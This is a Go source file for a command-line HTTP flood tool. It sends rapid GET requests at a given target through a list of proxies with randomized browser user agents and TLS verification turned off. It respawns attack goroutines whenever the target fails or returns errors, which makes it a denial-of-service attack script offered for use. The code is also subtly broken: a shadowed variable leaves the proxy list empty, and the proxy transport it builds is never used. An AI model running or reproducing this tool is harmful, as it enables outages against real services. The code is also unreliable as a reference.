package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	defaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36"
)

var (
	proxies        = []string{}
	requestsPerSec = 100 // Adjust as needed
)

func http2(target string, clientPool *sync.Pool, quit chan struct{}) {
	proxy := fmt.Sprintf("http://%s", proxies[rand.Intn(len(proxies))])
	config := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		NextProtos:         []string{"h2"},
	}

	url, _ := url.Parse(proxy)
	httpTransport := &http.Transport{
		Proxy:             http.ProxyURL(url),
		ForceAttemptHTTP2: true,
		TLSClientConfig:   config,
		Dial: (&net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
			DualStack: true,
		}).Dial,
		DialTLS: func(network, addr string) (net.Conn, error) {
			dialer := &net.Dialer{
				Timeout: 5 * time.Second,
			}
			conn, err := dialer.Dial(network, addr)
			if err != nil {
				return nil, err
			}
			tlsConn := tls.Client(conn, config)
			err = tlsConn.Handshake()
			if err != nil {
				return nil, err
			}
			return tlsConn, nil
		},
	}

	req, _ := http.NewRequest("GET", target, nil)
	userAgent := fmt.Sprintf(defaultUserAgent, rand.Intn(20)+95)
	req.Header.Set("User-Agent", userAgent)

	client := clientPool.Get().(*http.Client)
	resp, err := client.Do(req)
	if err != nil || (resp.StatusCode >= 400 && resp.StatusCode != 404) {
		clientPool.Put(client)
		select {
		case <-quit:
			return
		default:
			go http2(target, clientPool, quit)
		}
	} else {
		clientPool.Put(client)
	}
}

func loadProxiesFromFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxies = append(proxies, strings.TrimSpace(scanner.Text()))
	}
	return proxies, scanner.Err()
}

func main() {
	rand.Seed(time.Now().UnixNano())
	if len(os.Args) < 6 {
		fmt.Println("Usage: target duration rps proxy_file threads")
		return
	}

	target := os.Args[1]
	duration, _ := strconv.Atoi(os.Args[2])
	rps, _ := strconv.Atoi(os.Args[3])
	proxylist := os.Args[4]
	threads, _ := strconv.Atoi(os.Args[5])

	proxies, err := loadProxiesFromFile(proxylist)
	if err != nil {
		fmt.Println("Error reading proxy file:", err)
		return
	}

	if len(proxies) == 0 {
		fmt.Println("No proxies found in file")
		return
	}

	clientPool := &sync.Pool{
		New: func() interface{} {
			return &http.Client{
				Transport: &http.Transport{
					TLSClientConfig: &tls.Config{},
				},
			}
		},
	}

	quit := make(chan struct{})
	defer close(quit)

	for i := 0; i < threads; i++ {
		go http2(target, clientPool, quit)
		time.Sleep(time.Second / time.Duration(rps))
	}

	time.Sleep(time.Duration(duration) * time.Second)
}
